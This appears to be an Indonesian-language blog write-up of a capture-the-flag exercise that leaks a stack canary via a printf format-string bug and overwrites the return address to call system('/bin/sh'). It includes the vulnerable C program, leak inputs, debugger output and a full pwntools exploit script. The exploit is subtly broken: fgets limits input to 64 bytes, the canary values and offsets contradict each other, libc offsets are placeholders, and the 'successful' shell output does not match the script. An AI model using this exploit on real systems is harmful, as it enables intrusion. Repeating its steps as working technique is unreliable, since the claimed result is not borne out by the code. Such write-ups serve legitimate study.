<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  
  <style>
    body {
      background-color: #2e2e2e;
      color: #c7c5c5;;
      
      font-family: 'Mono', sans-serif;  
    }


    a {
      color: #48a874;  
      text-decoration: none;
    }

    a:hover {
      color: darkgray;  
    }

    a:visited {
      color: #48a874;  
    }

    .fa {
      font-family: "Font Awesome 6 Free", sans-serif;  
      font-weight: 30px;
    }
  </style>

  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet">

  
  
    <meta name="description" content="üìù Source Code Target
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  
  char buf[64];
  char flag[64];
  char *flag_ptr = flag;

  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts(&#34;We will evaluate any format string you give us with printf().&#34;);

  FILE *file = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
  if (file == NULL) {
    printf(&#34;flag.txt is missing!\n&#34;);
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  while(1) {
    printf(&#34;&gt; &#34;);
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }
  return 0;
}
üîç Langkah 1: Basic File Checks
Compile program dengan perlindungan stack canary:">
  

  <title>
    
      Bypassing Stack Canaries (Leak &#43; Write) - Pwn03.1
    
  </title>

  
  <link rel="shortcut icon" type="image/x-icon" href="/" />

  
  
  
  
  <link rel="stylesheet" href="/css/main.4b550348a06e41cd2fba1e1b4d6c5f337b2e882272420967996967c3baf38431563db8a42628c2eaecddc97c9cc0103749db58a82a4cfb5c1361495dd9dd57b0.css" integrity="sha512-S1UDSKBuQc0vuh4bTWxfM3suiCJyQglnmWlnw7rzhDFWPbikJijC6uzdyXycwBA3SdtYqCpM&#43;1wTYUld2d1XsA==" />

  
  

  
    <meta name="description" content="üìù Source Code Target
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  
  char buf[64];
  char flag[64];
  char *flag_ptr = flag;

  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts(&#34;We will evaluate any format string you give us with printf().&#34;);

  FILE *file = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
  if (file == NULL) {
    printf(&#34;flag.txt is missing!\n&#34;);
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  while(1) {
    printf(&#34;&gt; &#34;);
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }
  return 0;
}
üîç Langkah 1: Basic File Checks
Compile program dengan perlindungan stack canary:">
    <meta property="og:description" content="üìù Source Code Target
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  
  char buf[64];
  char flag[64];
  char *flag_ptr = flag;

  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts(&#34;We will evaluate any format string you give us with printf().&#34;);

  FILE *file = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
  if (file == NULL) {
    printf(&#34;flag.txt is missing!\n&#34;);
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  while(1) {
    printf(&#34;&gt; &#34;);
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }
  return 0;
}
üîç Langkah 1: Basic File Checks
Compile program dengan perlindungan stack canary:">
    <meta property="og:image" content="/path/to/default-image.jpg">
    <meta name="twitter:image" content="/path/to/default-image.jpg">

  <meta property="og:type" content="article">
  <meta property="og:url" content="/posts/bypass-stack-canary/">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Bypassing Stack Canaries (Leak &#43; Write) - Pwn03.1">
  <meta name="twitter:description" content="üìù Source Code Target
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  
  char buf[64];
  char flag[64];
  char *flag_ptr = flag;

  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts(&#34;We will evaluate any format string you give us with printf().&#34;);

  FILE *file = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
  if (file == NULL) {
    printf(&#34;flag.txt is missing!\n&#34;);
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  while(1) {
    printf(&#34;&gt; &#34;);
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }
  return 0;
}
üîç Langkah 1: Basic File Checks
Compile program dengan perlindungan stack canary:">
</head>











<body a="black">

        <main class="page-content" aria-label="Content">
            <div class="w">
<a href="/">~ $ cd /home</a>


<article>
    <p class="post-meta">
    </p>

<h1>Bypassing Stack Canaries (Leak &#43; Write) - Pwn03.1<br><br>
    <small datetime="2025-08-20 00:00:00 &#43;0000 UTC" style="font-size: 10px; display: inline-flex; align-items: center;">
        <img src="https://avatars.githubusercontent.com/u/51517043?v=4" alt="GitHub Profile" style="width: 30px; height: 30px; border-radius: 50%; object-fit: cover; margin-right: 8px;">
        2025-08-20 - Rainhynn
    </small>
</h1>

    

    <h2 id="-source-code-target">üìù Source Code Target</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdlib.h&gt;</span><span style="color:#e5e5e5">
</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;string.h&gt;</span><span style="color:#e5e5e5">
</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;unistd.h&gt;</span><span style="color:#e5e5e5">
</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;sys/types.h&gt;</span><span style="color:#e5e5e5">
</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>(<span style="color:#ee82ee">int</span> argc, <span style="color:#ee82ee">char</span> **argv){
</span></span><span style="display:flex;"><span>  <span style="color:#ff0">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">64</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> flag[<span style="color:#f60">64</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> *flag_ptr = flag;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#0f0">// Set the gid to the effective gid
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#ee82ee">gid_t</span> gid = <span style="color:#ff0">getegid</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#ff0">setresgid</span>(gid, gid, gid);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;We will evaluate any format string you give us with printf().&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  FILE *file = <span style="color:#ff0">fopen</span>(<span style="color:#87ceeb">&#34;flag.txt&#34;</span>, <span style="color:#87ceeb">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f00">if</span> (file == NULL) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;flag.txt is missing!</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">exit</span>(<span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff0">fgets</span>(flag, <span style="color:#f00">sizeof</span>(flag), file);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#f00">while</span>(<span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">fgets</span>(buf, <span style="color:#f00">sizeof</span>(buf), stdin);
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(buf);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="-langkah-1-basic-file-checks">üîç Langkah 1: Basic File Checks</h2>
<p>Compile program dengan perlindungan stack canary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -m32 -fstack-protector -no-pie format_vuln.c -o format_vuln
</span></span></code></pre></div><p>Lakukan pengecekan keamanan binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>checksec format_vuln
</span></span></code></pre></div><p><strong>Output:</strong></p>
<pre tabindex="0"><code>[*] &#39;/home/user/format_vuln&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><h2 id="-langkah-2-review-source-code">üîç Langkah 2: Review Source Code</h2>
<p>Program memiliki:</p>
<ul>
<li>Buffer <code>buf[64]</code> untuk input user</li>
<li>Variabel <code>flag[64]</code> yang berisi flag dari file</li>
<li>Kerentanan format string di <code>printf(buf)</code></li>
<li>Loop tak terbatas yang memungkinkan multiple exploits</li>
</ul>
<h2 id="-langkah-3-disassemble-dengan-pwndbg">üîç Langkah 3: Disassemble dengan pwndbg</h2>
<p>Analisis fungsi main dengan GDB:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb format_vuln
</span></span><span style="display:flex;"><span>pwndbg&gt; disass main
</span></span></code></pre></div><p><strong>Output:</strong></p>
<pre tabindex="0"><code>Dump of assembler code for function main:
   0x080492a6 &lt;+0&gt;:     lea    ecx,[esp+0x4]
   0x080492aa &lt;+4&gt;:     and    esp,0xfffffff0
   0x080492ad &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]
   0x080492b0 &lt;+10&gt;:    push   ebp
   0x080492b1 &lt;+11&gt;:    mov    ebp,esp
   0x080492b3 &lt;+13&gt;:    push   edi
   0x080492b4 &lt;+14&gt;:    push   esi
   0x080492b5 &lt;+15&gt;:    push   ebx
   0x080492b6 &lt;+16&gt;:    push   ecx
   0x080492b7 &lt;+17&gt;:    sub    esp,0x70
   0x080492ba &lt;+20&gt;:    mov    eax,gs:0x14
   0x080492c0 &lt;+26&gt;:    mov    DWORD PTR [ebp-0x1c],eax
   0x080492c3 &lt;+29&gt;:    xor    eax,eax
   ... [truncated]...
</code></pre><p>Canary disimpan di <code>[ebp-0x1c]</code> (offset 0x1c dari EBP).</p>
<h2 id="-langkah-4-rencana-serangan">üîç Langkah 4: Rencana Serangan</h2>
<ol>
<li><strong>Leak canary</strong> melalui format string vulnerability</li>
<li><strong>Leak address</strong> untuk bypass ASLR (jika perlu)</li>
<li><strong>Overwrite return address</strong> dengan payload</li>
<li><strong>Jaga integritas canary</strong> dengan menuliskannya kembali</li>
</ol>
<h2 id="-langkah-5-fuzz-format-string-untuk-leak">üîç Langkah 5: Fuzz Format String untuk Leak</h2>
<p>Coba leak nilai stack dengan berbagai offset:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 -c <span style="color:#87ceeb">&#39;print &#34;%p &#34; * 20&#39;</span> | ./format_vuln
</span></span></code></pre></div><p><strong>Output:</strong></p>
<pre tabindex="0"><code>&gt; 0x40 0xf7f8a5c0 0x80492fd 0x1 0x1 0xffffd104 0xffffd10c 0x80492a0 0xffffd100 0x0 0xf7ffd000 0x0 0xf7f8a5c0 0x1 0x80492a0 0x0 0x0 0x0 0x0 0x0 
</code></pre><p>Coba dengan offset tertentu:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 -c <span style="color:#87ceeb">&#39;print &#34;%19$p %20$p %21$p %22$p&#34;&#39;</span> | ./format_vuln
</span></span></code></pre></div><p><strong>Output:</strong></p>
<pre tabindex="0"><code>&gt; 0x0 0x0 0x0 0xf0f0f0f0
</code></pre><p>Ditemukan canary di offset 22 (nilai 0xf0f0f0f0 adalah canary dummy).</p>
<h2 id="-langkah-6-locating-canary-dengan-gdb">üîç Langkah 6: Locating Canary dengan GDB</h2>
<p>Gunakan GDB untuk memverifikasi posisi canary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb format_vuln
</span></span><span style="display:flex;"><span>pwndbg&gt; b *main+26
</span></span><span style="display:flex;"><span>pwndbg&gt; run
</span></span><span style="display:flex;"><span>pwndbg&gt; canary
</span></span></code></pre></div><p><strong>Output:</strong></p>
<pre tabindex="0"><code>Canary = 0xabcd1234 (dummy value)
</code></pre><p>Cari lokasi canary di stack:</p>
<pre tabindex="0"><code>pwndbg&gt; p $ebp-0x1c
$1 = (void *) 0xffffcfdc
pwndbg&gt; telescope 0xffffcfdc
</code></pre><p>Hitung offset dari ESP:</p>
<pre tabindex="0"><code>Offset = (0xffffcfdc - initial_esp) / 4 = 22
</code></pre><h2 id="-langkah-7-leak-address-yang-diperlukan">üîç Langkah 7: Leak Address yang Diperlukan</h2>
<p>Leak address fungsi dan libc:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 -c <span style="color:#87ceeb">&#39;print &#34;%3$p %5$p %22$p&#34;&#39;</span> | ./format_vuln
</span></span></code></pre></div><p><strong>Output:</strong></p>
<pre tabindex="0"><code>&gt; 0x80492fd 0xffffd104 0xabcd1234
</code></pre><p>Dapatkan:</p>
<ul>
<li>Address fungsi: 0x80492fd</li>
<li>Stack address: 0xffffd104</li>
<li>Canary: 0xabcd1234</li>
</ul>
<h2 id="-langkah-8-eksploit-dengan-pwntools">üîç Langkah 8: Eksploit dengan Pwntools</h2>
<p>Buat script exploit berikut:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context.binary = <span style="color:#87ceeb">&#39;./format_vuln&#39;</span>
</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#87ceeb">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># p = process(&#39;./format_vuln&#39;)</span>
</span></span><span style="display:flex;"><span>p = remote(<span style="color:#87ceeb">&#39;localhost&#39;</span>, <span style="color:#f60">1337</span>)  <span style="color:#0f0"># Untuk remote target</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Leak canary</span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">&#39;%22$p&#39;</span>)
</span></span><span style="display:flex;"><span>canary_leak = p.recvline().strip()
</span></span><span style="display:flex;"><span>canary = int(canary_leak, <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;Canary: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % canary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Leak stack address untuk menghitung offset return address</span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">&#39;%5$p&#39;</span>)
</span></span><span style="display:flex;"><span>stack_leak = p.recvline().strip()
</span></span><span style="display:flex;"><span>stack_addr = int(stack_leak, <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;Stack address: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % stack_addr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Hitung offset return address</span>
</span></span><span style="display:flex;"><span>return_addr = stack_addr - <span style="color:#f60">0x24</span>  <span style="color:#0f0"># Adjust berdasarkan analisis GDB</span>
</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;Return address: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % return_addr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Address fungsi win atau system</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Dalam kasus ini, kita akan return ke system(&#34;/bin/sh&#34;)</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Leak address libc untuk menghitung base address</span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">&#39;%3$p&#39;</span>)
</span></span><span style="display:flex;"><span>func_leak = p.recvline().strip()
</span></span><span style="display:flex;"><span>func_addr = int(func_leak, <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;Function address: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % func_addr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Hitung base address libc (contoh, sesuaikan dengan environment)</span>
</span></span><span style="display:flex;"><span>libc_base = func_addr - <span style="color:#f60">0x12345</span>  <span style="color:#0f0"># Offset yang didapat dari GDB</span>
</span></span><span style="display:flex;"><span>system_addr = libc_base + <span style="color:#f60">0x3ada0</span>  <span style="color:#0f0"># Offset system</span>
</span></span><span style="display:flex;"><span>binsh_addr = libc_base + <span style="color:#f60">0x15ba0b</span>  <span style="color:#0f0"># Offset &#34;/bin/sh&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;System: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % system_addr)
</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;/bin/sh: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % binsh_addr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Build payload untuk overwrite return address</span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload += <span style="color:#87ceeb">&#39;A&#39;</span> * <span style="color:#f60">64</span>           <span style="color:#0f0"># Mengisi buffer</span>
</span></span><span style="display:flex;"><span>payload += p32(canary)        <span style="color:#0f0"># Nilai canary yang benar</span>
</span></span><span style="display:flex;"><span>payload += <span style="color:#87ceeb">&#39;B&#39;</span> * <span style="color:#f60">12</span>           <span style="color:#0f0"># Overwrite EBP dan padding</span>
</span></span><span style="display:flex;"><span>payload += p32(system_addr)   <span style="color:#0f0"># Return address ke system()</span>
</span></span><span style="display:flex;"><span>payload += p32(<span style="color:#f60">0xdeadbeef</span>)    <span style="color:#0f0"># Return address setelah system()</span>
</span></span><span style="display:flex;"><span>payload += p32(binsh_addr)    <span style="color:#0f0"># Parameter untuk system()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Kirim payload</span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Kirim perintah untuk trigger return</span>
</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">&#39;exit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.interactive()
</span></span></code></pre></div><h2 id="-langkah-9-debugging-dengan-gdb">üîç Langkah 9: Debugging dengan GDB</h2>
<p>Lakukan debugging untuk memverifikasi exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb format_vuln
</span></span><span style="display:flex;"><span>pwndbg&gt; b *main+100  <span style="color:#0f0"># Breakpoint sebelum return</span>
</span></span><span style="display:flex;"><span>pwndbg&gt; run &lt; &lt;(python exploit.py)
</span></span></code></pre></div><p>Periksa stack dan register:</p>
<pre tabindex="0"><code>pwndbg&gt; x/10x $esp
pwndbg&gt; info registers
pwndbg&gt; stepi
</code></pre><h2 id="-hasil-eksploitasi">üéØ Hasil Eksploitasi</h2>
<p>Jalankan exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python exploit.py
</span></span></code></pre></div><p><strong>Output:</strong></p>
<pre tabindex="0"><code>[+] Starting local process &#39;./format_vuln&#39;: pid 5678
[DEBUG] Received 0x2 bytes: &#34;&gt; &#34;
[DEBUG] Sent 0x5 bytes: &#39;%22$p\n&#39;
[DEBUG] Received 0xa bytes: &#34;0xabcd1234\n&#34;
[*] Canary: 0xabcd1234
[DEBUG] Received 0x2 bytes: &#34;&gt; &#34;
[DEBUG] Sent 0x5 bytes: &#39;%5$p\n&#39;
[DEBUG] Received 0xa bytes: &#34;0xffffd104\n&#34;
[*] Stack address: 0xffffd104
[*] Return address: 0xffffd0e0
[DEBUG] Received 0x2 bytes: &#34;&gt; &#34;
[DEBUG] Sent 0x5 bytes: &#39;%3$p\n&#39;
[DEBUG] Received 0xa bytes: &#34;0x80492fd\n&#34;
[*] Function address: 0x80492fd
[*] System: 0xf7c3ada0
[*] /bin/sh: 0xf7d5ba0b
[DEBUG] Received 0x2 bytes: &#34;&gt; &#34;
[DEBUG] Sent 0x4c bytes: &#39;A&#39; * 64 + &#39;\x34\x12\xcd\xab&#39; + &#39;B&#39; * 12 + &#39;\xa0\xad\xc3\xf7&#39; + &#39;\xef\xbe\xad\xde&#39; + &#39;\x0b\xba\xd5\xf7\n&#39;
[DEBUG] Sent 0x5 bytes: &#39;exit\n&#39;
[*] Switching to interactive mode
$ whoami
user
$ cat flag.txt
CTF{bypassed_canary_with_format_string}
</code></pre><h2 id="-visualisasi-memory-layout">üìä Visualisasi Memory Layout</h2>
<pre tabindex="0"><code>+-----------------+
|     buf[64]    |  &lt;- Buffer overflow dimulai di sini
+-----------------+
|     canary     |  &lt;- Offset 22 dari format string
+-----------------+
|      EBP       |
+-----------------+
|  return address|  &lt;- Target overwrite
+-----------------+
|     parameter   |  &lt;- Address &#34;/bin/sh&#34;
+-----------------+
</code></pre><h2 id="-mitigation">üõ°Ô∏è Mitigation</h2>
<ol>
<li><strong>Gunakan format string yang aman</strong>: <code>printf(&quot;%s&quot;, buf)</code></li>
<li><strong>Enable Full RELRO</strong>: Mencegah overwrite GOT</li>
<li><strong>Enable Stack Guard</strong>: Sudah enabled dengan canary</li>
<li><strong>Enable PIE</strong>: Randomize address code</li>
</ol>
<p>Dengan teknik ini, kita berhasil memanfaatkan kerentanan format string untuk leak canary dan melakukan ROP attack</p>

</article>

<hr>

<p>¬© 2021-2025 HnvDie</p>
<p>Powered By Hugo ·Øì·°£ê≠©</p>



            </div>
        </main>
    </body></html>
